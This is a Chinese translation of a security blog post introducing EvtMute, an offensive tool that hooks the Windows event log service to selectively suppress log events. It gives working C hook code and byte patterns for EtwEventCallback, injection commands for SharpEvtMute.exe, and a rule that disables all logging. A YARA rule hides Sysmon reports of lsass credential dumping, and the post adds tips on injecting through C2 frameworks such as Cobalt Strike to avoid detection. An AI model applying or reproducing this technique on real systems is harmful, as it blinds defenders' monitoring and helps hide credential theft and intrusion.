> 原文链接: https://www.anquanke.com//post/id/217922 


# 使用 YARA 规则阻止 Windows 事件日志记录


                                阅读量   
                                **148836**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者jumpsec，文章来源：labs.jumpsec.com
                                <br>原文地址：[https://labs.jumpsec.com/2020/09/04/pwning-windows-event-logging-with-yara-rules/](https://labs.jumpsec.com/2020/09/04/pwning-windows-event-logging-with-yara-rules/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p0.ssl.qhimg.com/t011da1c7a4e8774ea7.jpg)](https://p0.ssl.qhimg.com/t011da1c7a4e8774ea7.jpg)



Windows事件日志加上Windows事件转发和Sysmon工具是非常强大的防御手段，他们可以检测、记录到攻击者的每一步攻击过程。显然，这对攻击者来说是个问题。在攻击者完成提权操作之前，他们逃避事件日志的方法是有限的，但是一旦完成提权，就成了一个平等的竞技场。

我以前发布过一个通过加载恶意的内核驱动程序和Hook住NtTraceEvent系统调用来躲避日志记录的方法。这种方法是有效的，但有两个小问题。主要的问题是加载内核驱动程序和修补系统调用相关的风险，因为这个操作有可能导致机器蓝屏死机，这显然是一件非常糟糕的事情。另一个问题是，它将简单地停止报告所有事件，因此当钩子处于活动状态时，该机器将不再向SOC或SIEM发送任何事件。防御者很有可能会注意到事件的突然缺失。那么，是否有一种方法只过滤掉由攻击者引起的事件，同时也保留住正常的事件日志呢？答案是：有的。

几年前hlldz发布了Windows日志清除器Invoke-Phant0m工具。它会找到事件日志进程，然后杀死从wevtsvc.dll运行的所有线程。wevtsvc.dll是事件日志服务，通过终止与之关联的线程将禁用日志记录。它工作得很好，但是仍然存在相同的问题：它将停止报告所有事件。为了解决这个问题，我想制作一个类似于Invoke-Phant0m的工具，这个工具可以允许攻击者先对事件报告进行过滤，这样他们就只能阻止与恶意行为相关的事件被记录。



## 对Windows事件日志记录的逆向分析

打开wevtsvc.dll进行分析后，我注意到它将打开一个OpenTraceW函数跟踪会话。

[![](https://p0.ssl.qhimg.com/t01b9c8824afa9dd813.png)](https://p0.ssl.qhimg.com/t01b9c8824afa9dd813.png)

OpenTraceW把EVENT_TRACE_LOGFILEW结构作为自己的参数。这个结构的值是EventRecordCallback，它指向一个回调函数。

使用windbg工具进行更深入的分析后我发现这个回调函数是wevtsvc!EtwEventCallback

[![](https://p4.ssl.qhimg.com/t01c43901d073d79c69.png)](https://p4.ssl.qhimg.com/t01c43901d073d79c69.png)

查看回调函数的反汇编代码，它看起来不像一个函数，而只是一个调用EventCallback的程序集。

[![](https://p0.ssl.qhimg.com/t013bcbc46ed04becb8.png)](https://p0.ssl.qhimg.com/t013bcbc46ed04becb8.png)

在wevtsvc!EtwEventCallback上设置断点，让我们更深入地了解这个回调是如何工作的。它将在EVENT_RECORD结构中接收事件，如下所示：

```
typedef struct _EVENT_RECORD `{`
  EVENT_HEADER                     EventHeader;
  ETW_BUFFER_CONTEXT               BufferContext;
  USHORT                           ExtendedDataCount;
  USHORT                           UserDataLength;
  PEVENT_HEADER_EXTENDED_DATA_ITEM ExtendedData;
  PVOID                            UserData;
  PVOID                            UserContext;
`}` EVENT_RECORD, *PEVENT_RECORD;
```

EVENT_HEADER结构将包含更多关于事件的信息，包括报告事件的提供者。通过windbg的一个功能，我们能够获取这个提交者的GUID。

[![](https://p1.ssl.qhimg.com/t015b22ea4ee8c5baf6.png)](https://p1.ssl.qhimg.com/t015b22ea4ee8c5baf6.png)

现在我们有了提交者的GUID，我们可以使用logman.exe程序来查找它，可以看到提交者是Microsoft-Windows-Sysmon。

[![](https://p2.ssl.qhimg.com/t01614cd5ed9afc9d76.png)](https://p2.ssl.qhimg.com/t01614cd5ed9afc9d76.png)

我们可以修改这个函数，在这里加一个ret指令。这个操作会阻止所有事件报告的产生。

[![](https://p4.ssl.qhimg.com/t014512c1c30d9c6788.png)](https://p4.ssl.qhimg.com/t014512c1c30d9c6788.png)

在下图您可以看到，我在7:01清除了事件日志，然后在7:04添加了一个新用户，但是这个事件没有被报告，因为我们的ret在回调中导致了系统范围内的所有事件都不会被报告。

[![](https://p2.ssl.qhimg.com/t01a86b2217f35ce880.png)](https://p2.ssl.qhimg.com/t01a86b2217f35ce880.png)



## 利用钩子进行下一步操作

现在我们有了一个在windbg中正常工作的PoC，是时候开始编写代码了。我将跳过注入这个步骤，因为有很多很好的教程。直接来看下我们的DLL是如何工作的。

我们需要做的第一件事是找到wevtsvc!EtwEventCallback的偏移量，这样我们就知道把钩子放在哪里。第一步是定位wevtsvc.dll的基地址，下面的代码将完成这个任务并将其存储在dwBase变量中。

```
DWORD_PTR dwBase;
DWORD     i, dwSizeNeeded;
HMODULE   hModules[102400];
TCHAR     szModule[MAX_PATH];

if (EnumProcessModules(GetCurrentProcess(), hModules, sizeof(hModules), &amp;dwSizeNeeded))
`{`
    for (int i = 0; i &lt; (dwSizeNeeded / sizeof(HMODULE)); i++)
    `{`
        ZeroMemory((PVOID)szModule, MAX_PATH);

        if (GetModuleBaseNameA(GetCurrentProcess(), hModules[i], (LPSTR)szModule, sizeof(szModule) / sizeof(TCHAR)))
        `{`
            if (!strcmp("wevtsvc.dll", (const char*)szModule))
            `{`
                dwBase = (DWORD_PTR)hModules[i];
            `}`
        `}`
    `}`
`}`
```

因为我们不知道EtwEventCallback的确切位置，需要在内存中搜索它。但是我们知道它在wevtsvc.dll的地址空间中，这就是为什么我们必须首先找到它的基址。

我们可以使用windbg中的反汇编来查看回调开始时的字节。然后我们可以扫描内存，直到找到这些字节。这样我们就知道把钩子放在哪里了。

[![](https://p0.ssl.qhimg.com/t01465aa4ea16c2dc8c.png)](https://p0.ssl.qhimg.com/t01465aa4ea16c2dc8c.png)

下面这段代码将搜索从wevtsvc.dll基址开始的的0xfffff字节，以找到4883ec384c8b0d

```
#define PATTERN "\x48\x83\xec\x38\x4c\x8b\x0d"

DWORD i;
LPVOID lpCallbackOffset;

for (i = 0; i &lt; 0xfffff; i++)
`{`
    if (!memcmp((PVOID)(dwBase + i), (unsigned char*)PATTERN, strlen(PATTERN)))
    `{`
        lpCallbackOffset = (LPVOID)(dwBase + i);
    `}`
`}`
```

一旦我们有了偏移量，我们将通过调用memcpy对其中的字节进行复制。

```
memcpy(OriginalBytes, lpCallbackOffset, 50);
```

然后用一个钩子将所有对EtwEventCallback的调用重定向到EtwCallbackHook。

```
VOID HookEtwCallback()
`{`
    DWORD oldProtect, oldOldProtect;

    unsigned char boing[] = `{` 0x49, 0xbb, 0xde, 0xad, 0xc0, 0xde, 0xde, 0xad, 0xc0, 0xde, 0x41, 0xff, 0xe3 `}`;

    *(void **)(boing + 2) = &amp;EtwCallbackHook;

    VirtualProtect(lpCallbackOffset, 13, PAGE_EXECUTE_READWRITE, &amp;oldProtect);
    memcpy(lpCallbackOffset, boing, sizeof(boing));
    VirtualProtect(lpCallbackOffset, 13, oldProtect, &amp;oldOldProtect);

    return;
`}`
```

在这里钩住回调是很好的，但是我们仍然需要它能够报告我们不想阻止的事件。这意味着我们还必须恢复并运行回调，以便它报告事件。在它报告事件之后重新钩住它，以便我们可以捕捉下一个事件。

使用typedef可以非常直接地做到这一点。

```
typedef VOID(WINAPI * EtwEventCallback_) (EVENT_RECORD *EventRecord);

VOID DoOriginalEtwCallback( EVENT_RECORD *EventRecord )
`{`
    DWORD dwOldProtect;

    VirtualProtect(lpCallbackOffset, sizeof(OriginalBytes), PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);
    memcpy(lpCallbackOffset, OriginalBytes, sizeof(OriginalBytes));
    VirtualProtect(lpCallbackOffset, sizeof(OriginalBytes), dwOldProtect, &amp;dwOldProtect);

    EtwEventCallback_ EtwEventCallback = (EtwEventCallback_)lpCallbackOffset;

    EtwEventCallback(EventRecord);

    HookEtwCallback();
`}`
```

在完成所有这些操作之后，我们现在能够找到ETW回调函数的偏移量，将其挂钩到我们自己的函数并解析数据。然后解除回调并报告事件。

下面您可以在windbg窗口中看到解析后的事件。

[![](https://p5.ssl.qhimg.com/t01a2b9bf6c6ed727ff.png)](https://p5.ssl.qhimg.com/t01a2b9bf6c6ed727ff.png)



## 用YARA进行模式匹配

现在我们知道了事件报告的格式，可以开始实现日志过滤器了。我决定使用YARA规则有两个原因，第一个是我认为使用一个流行的防守工具进行进攻十分具有讽刺性。第二个原因是，它实际上非常适合在这个场景使用，因为它有一个非常好的文档化的C API，并且可以在内存中完成全部工作。

同样值得指出的是，我定义了如下宏以保持代码风格的一致性

[![](https://p5.ssl.qhimg.com/t018e6de80542361a25.png)](https://p5.ssl.qhimg.com/t018e6de80542361a25.png)

下面的代码展示了如何写出可在YRRulesScanMem中使用的yara规则。

```
#define RULE_ALLOW_ALL "rule Allow `{` condition: false `}`"

YRInitalize();

RtlCopyMemory(cRule, RULE_ALLOW_ALL, strlen(RULE_ALLOW_ALL));

if (YRCompilerCreate(&amp;yrCompiler) != ERROR_SUCCESS)
`{`
  return -1;
`}`

if (YRCompilerAddString(yrCompiler, cRule, NULL) != ERROR_SUCCESS)
`{`
  return -1;
`}`

YRCompilerGetRules(yrCompiler, &amp;yrRules);
```

YARA规则写好后，我们就可以开始扫描内存了。下面我们会扫描包含格式化事件内容的StringBuffer变量，并将结果传递给yara回调函数ToReportOrNotToReportThatIsTheQuestion。该函数将根据规则是否匹配而将dwReport变量设置为0或1。如果PIPE_NAME变量出现在事件中，还需要对其进行检查。原因是EvtMuteHook.dll将使用一个命名管道来动态更新当前规则，这将会生成事件日志，所以这个检查将确保这些事件日志不会被报告。

```
INT ToReportOrNotToReportThatIsTheQuestion( YR_SCAN_CONTEXT* Context,
    INT Message,
    PVOID pMessageData,
    PVOID pUserData
)
`{`
    if (Message == CALLBACK_MSG_RULE_MATCHING)
    `{`
        (*(int*)pUserData) = 1;
    `}`

    if (Message == CALLBACK_MSG_RULE_NOT_MATCHING)
    `{`
        (*(int*)pUserData) = 0;
    `}`

    return CALLBACK_CONTINUE;
`}`

YRRulesScanMem(yrRules, (uint8_t*)StringBuffer, strlen(StringBuffer), 0, ToReportOrNotToReportThatIsTheQuestion, &amp;dwReport, 0);

if (dwReport == 0)
`{`
    if (strstr(StringBuffer, PIPE_NAME) == NULL)
    `{`
        DoOriginalEtwCallback(EventRecord);
    `}`
`}`
```



## 日志去哪了?

您可以从`https://github.com/bats3c/EvtMute/releases/tag/v1.0`获取最新版本的EvtMute。EvtMuteHook.dll包含这个日志过滤工具的核心功能，一旦它被注入，它将作为一个临时过滤器，它在最初会允许所有的事件日志的上报，不过这个过滤器可以根据使用者的需要动态更新，而不需要重新注入。

我已经打包了一个c#程序集SharpEvtMute.exe，它可以在shad0w或cobalt strike中使用。我还将用C语言编写出一个版本，以让它能够更隐蔽的运行。

### <a class="reference-link" name="%E7%A6%81%E7%94%A8%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95"></a>禁用日志记录

一个简单的例子是在系统范围内禁用事件日志记录。为此，我们可以使用以下yara规则。

```
rule disable `{` condition: true `}`
```

我们首先需要将钩子注入到事件服务中。

```
.\SharpEvtMute.exe --Inject
```

[![](https://p4.ssl.qhimg.com/t01249b860a8ee06420.png)](https://p4.ssl.qhimg.com/t01249b860a8ee06420.png)

现在钩子已经放置好了，我们可以添加过滤器了。

```
.\SharpEvtMute.exe --Filter "rule disable `{` condition: true `}`"
```

[![](https://p1.ssl.qhimg.com/t011053ad44164be6e9.png)](https://p1.ssl.qhimg.com/t011053ad44164be6e9.png)

现在，所有的事件都不会被记录。

### <a class="reference-link" name="%E6%9B%B4%E5%8A%A0%E5%A4%8D%E6%9D%82%E7%9A%84%E8%BF%87%E6%BB%A4"></a>更加复杂的过滤

过滤器可以动态地改变参数，而不需要重新注入。

下面显示了一个更复杂的过滤器示例。它能够阻止sysmon报告lsass内存转储相关的事件。

```
rule block_lsass_dump `{`
    meta:
        author = "@_batsec_"
        description = "Prevent lsass dumping being reported by sysmon"
    strings:
        $provider = "Microsoft-Windows-Sysmon"
        $image = "lsass.exe" nocase
        $access = "GrantedAccess"
        $type = "0x1fffff"
    condition:
        all of them
`}`
```

对于这样一个复杂的规则，要将其压缩成一行就困难得多了。这就是为什么我添加了base64编码转换功能。

该功能可以很容易地从linux命令行转换为base64。

```
base64 -w 0 YaraFilters/lsassdump.yar | echo $(&lt;/dev/stdin)
```

然后使用“—Encoded”，我们就可以更新过滤器的过滤规则。

[![](https://p0.ssl.qhimg.com/t01abf134582daa3c2d.png)](https://p0.ssl.qhimg.com/t01abf134582daa3c2d.png)



## 注意事项

当注入钩子时，SharpEvtMute.exe会调用CreateRemoteThread，这个调用是在钩子被放置之前进行的，所以它会被Sysmon报告。这是因为SharpEvtMute.exe的注入特性只能作为PoC来使用。如果不想被记录，我建议手动将EvtMuteHook.dll注入到事件日志记录服务中。

PID可以通过运行”SharpEvtMute.exe —Pid”找到。钩子可以通过你选择的C2框架手动注入shellcode（在EvtMuteBin中运行make）来放置，例如shad0w中的shinject。

还值得一提的是，钩子将使用一个命名管道来更新过滤器。命名管道称为EvtMuteHook_Rule_Pipe（这个命名很容易被更改）。我们在钩子中嵌入了一条规则，以确保包括此名称在内的任何事件都会被自动删除，但IOC仍然在监听它，因此我建议更改它的运行方式。
